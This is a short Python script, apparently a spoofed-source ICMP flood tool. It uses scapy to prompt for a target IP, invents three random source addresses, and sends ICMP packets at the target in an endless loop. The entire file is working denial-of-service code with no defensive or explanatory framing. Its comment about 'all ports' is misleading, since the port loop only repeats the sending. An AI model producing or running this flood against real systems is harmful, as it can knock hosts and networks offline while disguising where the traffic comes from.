import random
import scapy.all as scapy


#To give input of target IP
target_IP = input("Enter IP address of Target: ")
i = 1

#Function to generate random IPs
def get_random_ip():
	ip = [str(random.randint(1,254)) for i in range(4)]
	return '.'.join(ip)

ip_list = [get_random_ip() for i in range(3)]
print(ip_list)

#Condition to send ICMP packets using all ports
while True:
	for source_port in range(1,65535):
		for source_IP in ip_list:
			IP1 = scapy.IP(src= source_IP, dst= target_IP)
			pkt = IP1 / scapy.ICMP()
			scapy.send(pkt,inter = .001)

			print ("source ip",source_IP,"packet sent ", i)
			i = i + 1

